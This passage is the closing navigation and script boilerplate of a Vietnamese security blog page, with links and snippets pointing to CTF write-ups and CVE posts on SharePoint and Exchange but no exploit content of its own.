Construction</a><li><a href="/posts/cve-2021-34520-microsoft-sharepoint-RCE/">CVE-2021-34520 Microsoft Sharepoint RCE</a><li><a href="/posts/CVE-2021-42321-Microsoft-Exchange-RCE/">CVE-2021-42321 Microsoft Exchange RCE</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/microsoft-sharepoint/">microsoft sharepoint</a> <a class="post-tag" href="/tags/brute-force/">brute force</a> <a class="post-tag" href="/tags/cve-2021-34520/">cve-2021-34520</a> <a class="post-tag" href="/tags/cve-2021-42321/">cve-2021-42321</a> <a class="post-tag" href="/tags/cve-2022-22005/">cve-2022-22005</a> <a class="post-tag" href="/tags/dom-xss/">dom xss</a> <a class="post-tag" href="/tags/ghost-script/">ghost script</a> <a class="post-tag" href="/tags/graphql/">graphql</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-under-construction/"><div class="card-body"> <em class="timeago small" data-ts="1630868820" > 2021-09-06 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Under Construction</h3><div class="text-muted small"><p> Under Contruction dẫn người dùng thẳng vào một trang login Mình đã thử detect SQLi ở đây tuy nhiên không thể khai thác được gì, thử đăng ký một tài khoản đơn sau đó login vào OK giao diện này...</p></div></div></a></div><div class="card"> <a href="/posts/all-baked-up-h@cktivitycon-2021-ctf/"><div class="card-body"> <em class="timeago small" data-ts="1632063600" > 2021-09-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>All Baked Up - H@cktivityCon 2021 CTF</h3><div class="text-muted small"><p> GraphQL Vì challenge này liên quan đến graphql và mình chưa biết về cái này nên sẽ mô tả qua ở đây một chút. GraphQL là ngôn ngữ truy vấn cho các API và runtime để thực hiện các truy vấn đó với dữ ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-petpet-rcbee/"><div class="card-body"> <em class="timeago small" data-ts="1630806660" > 2021-09-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Petpet Rcbee</h3><div class="text-muted small"><p> Petpet rcbee là một web challenge. Sau khi xem xét thì thấy rằng trang web chỉ có một chức năng duy nhất là upload 1 ảnh sau đó “pet” ảnh này. Oke kiểm tra source code xem có gì có thể lợi dụng ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/cve-2022-22005-microsoft-sharepoint-RCE/" class="btn btn-outline-primary" prompt="Older"><p>CVE-2022-22005 Microsoft Sharepoint RCE</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "hnd3884/hnd3884.github.io", "data-repo-id": "MDEwOlJlcG9zaXRvcnk0MDMwNzU4NDU=", "data-category": "Announcements", "data-category-id": "DIC_kwDOGAZzBc4CBUan", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "top", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/svcrps38">Dinh Hoang</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/microsoft-sharepoint/">microsoft sharepoint</a> <a class="post-tag" href="/tags/brute-force/">brute force</a> <a class="post-tag" href="/tags/cve-2021-34520/">cve-2021-34520</a> <a class="post-tag" href="/tags/cve-2021-42321/">cve-2021-42321</a> <a class="post-tag" href="/tags/cve-2022-22005/">cve-2022-22005</a> <a class="post-tag" href="/tags/dom-xss/">dom xss</a> <a class="post-tag" href="/tags/ghost-script/">ghost script</a> <a class="post-tag" href="/tags/graphql/">graphql</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-PQ5K8VK6JD"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-PQ5K8VK6JD'); }); </script>
